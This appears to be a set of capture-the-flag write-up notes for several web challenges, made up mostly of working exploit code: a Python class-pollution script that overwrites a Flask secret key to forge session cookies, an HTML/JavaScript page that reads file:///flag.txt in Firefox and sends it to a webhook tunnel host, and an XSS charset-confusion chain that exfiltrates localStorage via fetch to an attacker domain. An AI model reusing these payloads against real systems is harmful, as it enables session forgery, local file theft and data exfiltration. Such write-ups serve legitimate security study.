# MYTHOS
Tags: #class-pollution #python #perl
```python
import requests
import json 
import subprocess

SECRET_KEY = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

class Exploit:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()

        self.session.get(self.url)

    def _(self, path):
        return f"{self.url}/{path.lstrip('/')}"

    def craft_session(self, player_name):
        pwn = {"UNIVERSAL": {"can": "item_delegate"}, "desc_filename": "./flag.txt"}
        payload = '{"game": {"ev_choice": [{"desc": "Go through the arched doors", "goto": 9, "id": 0}, {"desc": "Go out the window", "goto": 1, "id": 1}], "ev_desc": "You find yourself in a large foyer, with marble walls and glass columns. Red velvet adorns most surfaces, leading up to an arched gate at the end of the room. Alternatively, one of the many ceiling-high windows is available to jump out into the courtyard below.", "ev_title": "The Antechamber", "player": "YYY", "success": 1}, "items": b\'XXX\'}'
        
        payload = payload.replace("XXX", json.dumps(pwn))
        payload = payload.replace("YYY", player_name)

        eval(payload)
        print(payload)

        cookie = subprocess.check_output(
            ["flask-unsign", "-s", "-S", str(SECRET_KEY), "-c", payload]
        )
        return cookie.decode().strip()
    
    def decode_session(self, session_cookie=None):
        return eval(subprocess.check_output( ["flask-unsign", "-d", "-c", session_cookie or self.session.cookies.get("session")],
            text=True
        )) 

    def pollute(self):
        r = requests.get(self._("/"))
        r = requests.post(
            self._("/score"),
            json={
                "__class__": {
                    "__init__": {
                        "__globals__": {
                            "app": {
                                "secret_key": SECRET_KEY
                            }
                        }
                    }
                }
            },
            cookies=r.cookies
        )
        print(r.text)
     
    def play(self, choice):
        data = {
            "choice": choice
        }
        response = self.session.post(self._("/play"), json=data)
        return response.text
    
    def to_20(self):
        self.play(0)
        self.play(0)
        self.play(0)

        session = self.decode_session()
        player_name = session["game"]["player"]

        self.pollute()
        pwn_session = self.craft_session(player_name)
        print(pwn_session)
        r = requests.post(
            self._("/play"),
            json={"choice": 0},
            cookies={"session": pwn_session}
        )
        print(self.decode_session(r.cookies.get("session")))
        print(r.text)


c = Exploit("https://pidyt2ai-mythos.instancer.2025.ctfcompetition.com/")
c.to_20()
```

# Sourceless
Solves: 
Tags: #firefox #afr #sop 

exploit:
```html
<!DOCTYPE html>
<html>
<body>
    <iframe id="leaky_frame" style="display:none;"></iframe>
    <script>
        const WEBHOOK_URL = "http://webhook/";
        const iframe = document.getElementById('leaky_frame');
        
        let stage = 0;

        iframe.onload = function() {
            if (stage === 0) {
                stage = 1;
                iframe.src = "javascript:window.name = document.body.innerText";
            } else if (stage === 1) {
                try {
                    const flag = iframe.contentWindow.name;
                    fetch(`${WEBHOOK_URL}?flag=${btoa(flag.trim())}`);
                } catch (e) {
                    fetch(`${WEBHOOK_URL}?flag=${btoa(e.toString())}`);
                }
            }
        };

        iframe.src = 'file:///flag.txt';
    </script>
</body>
</html>
```
save the exploit in the localdb, then open it with file protocol:
```html
<script>
const request = indexedDB.open("sas.html", 2);

request.onupgradeneeded = function(event) {
  const db = event.target.result;
  db.createObjectStore("fileStore");
};

request.onsuccess = function(event) {
  const db = event.target.result;

  const blob = new Blob(["<!DOCTYPE html><html><body><iframe id='leaky_frame' style='display:none;''></iframe><script>const WEBHOOK_URL = 'http://1edd6bfb9b1f35.lhr.life/';const iframe = document.getElementById('leaky_frame');let stage = 0;iframe.onload = function() {if (stage === 0) {stage = 1;iframe.src = 'javascript:window.name = document.body.innerText';} else if (stage === 1) {try {const flag = iframe.contentWindow.name;fetch(`${WEBHOOK_URL}?flag=${btoa(flag.trim())}`);window.location.href = `${WEBHOOK_URL}?flag=${btoa(flag.trim())}`;} catch (e) {fetch(`${WEBHOOK_URL}?flag=${btoa(e.toString())}`);window.location.href = `${WEBHOOK_URL}?error=${btoa(e.toString())}`;}}};iframe.src = 'file:///flag.txt';\x3c/script>\x3c/body>\x3c/html>"], { type: "text/html" });

  const tx = db.transaction("fileStore", "readwrite");
  const store = tx.objectStore("fileStore");
  store.put(blob, "sas.html");

  tx.oncomplete = (e) => console.log("Blob salvato su IndexedDB!", e);
};
</script>
```

serve the files and exploit:
```python
filename = "file:///tmp/firefox-userdata/storage/default/http+++1edd6bfb9b1f35.lhr.life^userContextId=7/idb/724218079slamst.h.files/1"
requests.get(f"{host}/?url={webhook_url}/save_db.html")
# get the file name then call this
requests.get(f"{host}/?url={quote(filename)}")
```

this works because of this setting:
`security.fileuri.strict_origin_policy` is set as false by default

`CTF{Loo!ong_longg_l1ve_the_XSSI!!}`

#xssi #cve #firefox 
https://gist.github.com/terjanq/4cb40653760c1ba8c33ee06be098d508#sourceless-writeup-by-terjanq

---

# Lost In Transliteration
Solves: 
Tags: #xss #charset 
## Description
> We found a service that converts Greek characters to Latin. It seems simple: ΕΛΛΑΣ becomes ELLAS. However, our logs show some very strange outputs. The service is flawed, but we think it's by design. There's a secret hidden in the way it handles the characters. Your job is to find what's "lost" in the transliteration. The flag is in there somewhere. Good luck.
## Road to flag
The flag is in the bot localstorage -> XSS
## Code review
- It's possible to get **script.js** with any content type that starts with `text/`
```csharp
app.MapGet("/file", (string filename = "", string? ct = null, string? q = null) =>
{
  string? template = FindFile(filename);
  if (template is null)
  {
    return Results.NotFound();
  }
  ct ??= "text/plain";
  if (!IsValidContentType(ct))
  {
    return Results.BadRequest("Invalid Content-Type");
  }
  string text = template
      .Replace("TEMPLATE_QUERY_JS", JsEncode(q));
  return Results.Text(text, contentType: ct);
});
```
- Special characters are escaped
```csharp
private static bool IsSafeChar(char c)
  {
    var cat = char.GetUnicodeCategory(c);
    // We don't consider ModifierLetter safe.
    var isLetter = cat == UnicodeCategory.LowercaseLetter ||
                   cat == UnicodeCategory.UppercaseLetter ||
                   cat == UnicodeCategory.OtherLetter;

    return isLetter || char.IsWhiteSpace(c);
  }

  private static string JsEncode(string? s)
  {
    if (s is null)
    {
      return "";
    }
    var sb = new StringBuilder();
    foreach (char c in s)
    {
      if (IsSafeChar(c))
      {
        sb.Append(c);
      }
      else
      {
        sb.Append("\\u");
        sb.Append(Convert.ToInt32(c).ToString("x4"));
      }
    }
    return sb.ToString();
  }
```
## Exploitation

1. Finding a charset with interesting mappings
with x-Chinese-CNS
```c#
using System;
using System.Text;
using System.Globalization;
using System.Collections.Generic;
using System.Linq;

class ComprehensiveSearch
{
    static bool IsSafeChar(char c)
    {
        var cat = char.GetUnicodeCategory(c);
        var isLetter = cat == UnicodeCategory.LowercaseLetter ||
                       cat == UnicodeCategory.UppercaseLetter ||
                       cat == UnicodeCategory.OtherLetter;

        return isLetter || char.IsWhiteSpace(c);
    }

    static void Main()
    {
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        
        Console.WriteLine("Starting comprehensive search...\n");
        
        // Get all available encodings
        var encodings = Encoding.GetEncodings();
        Console.WriteLine($"Total encodings to test: {encodings.Length}");
        
        // Find all chars that pass IsSafeChar
        var safeChars = new List<char>();
        for (int i = 0; i < 0x10000; i++)
        {
            char c = (char)i;
            if (IsSafeChar(c))
            {
                safeChars.Add(c);
            }
        }
        Console.WriteLine($"Total safe chars to test: {safeChars.Count}\n");
        
        // Test each encoding with each safe char
        foreach (var encodingInfo in encodings)
        {
            try
            {
                var encoding = Encoding.GetEncoding(encodingInfo.CodePage);
                
                foreach (var c in safeChars)
                {
                    try
                    {
                        byte[] bytes = encoding.GetBytes(new char[] { c });
                        
                        if (bytes.Contains((byte)0x27))
                        {
                            Console.WriteLine($"FOUND!");
                            Console.WriteLine($"  Encoding: {encodingInfo.Name} (CodePage: {encodingInfo.CodePage})");
                            Console.WriteLine($"  Character: U+{(int)c:X4} '{c}'");
                            Console.WriteLine($"  Category: {char.GetUnicodeCategory(c)}");
                            Console.WriteLine($"  Bytes: {BitConverter.ToString(bytes)}");
                            Console.WriteLine($"  URL Encoded: {Uri.EscapeDataString(c.ToString())}");
                            Console.WriteLine();
                        }
                    }
                    catch
                    {
                        // Character not encodable in this encoding
                    }
                }
            }
            catch
            {
                // Encoding not available
            }
        }
        
        Console.WriteLine("Search complete.");
    }
}
```
2. Make the xss valid
```
// TODO: Maybe we should move this directly to HTML into a <script> tag?
window.q = 'asdaÃ'??Ã:alert
var µ=setTimeout
µ`alert\u0028\u0031\u0029\u002f\u002fÐ`
var tag
µ`';

// XSS prevention
const PAYLOADS = [`<script>`, `</script>`, `javascript:`, `onerror=`];
```
`/file?filename=script.js&ct=text/html;charset=x-Chinese-CNS&q=asda%E6%90%B3%C5%82%C5%82%E6%90%A5alert%0avar%20%E6%83%8FsetTimeout%0a%E6%8E%A4alert(1)//%E6%92%9F%0avar%20tag%0a%E6%8E%A4`

or with x-cp20004

```
import json
import requests

payload = """
û' instanceof ø: eval
var tag
evalñ=eval
locö=location
hashö=locö.hash
decodeñ=decodeURIComponent
payloadö=decodeñ(hashö)
evalñ(payloadö)
ú`
""".strip()


translate = {
    "ø'": '鱆',
    "ø:": '鱕',
    "ö.": '騝',
    "ñ=": '鐋',
    "ñ(": '鐆',
    "ö=": '騹',
    "ö)": '騆',
    'à(': '薋',
    'à)': '薣',
    'ú`': '黤',
    "ù'": "鵛",
    "û'": "齖",
}

for k,v in translate.items():
    payload = payload.replace(k, v)

# js_payload = "alert(1)"
EXFIL_DOMAIN = 'http://YOUR_DOMAIN'
js_payload = f'fetch("{EXFIL_DOMAIN}/"+localStorage.getItem("flag"))'

url = "http://localhost:1337/file?filename=script.js&q=" + payload.replace('\n', '%0a') + "&ct=text/html;charset=x-cp20004#!%0A" + js_payload
print(url)

HOST = 'https://ornbqrch-lost-in-transliteration.instancer.2025.ctfcompetition.com'
r = requests.get(HOST + '/xss-bot', params={'url': url})
print(r.text)
```


# Postviewer v5²
Solves: 
Tags: #race-condition #client-side #rng
https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8
https://gist.github.com/terjanq/69fd6290ec2d77852c02635392300660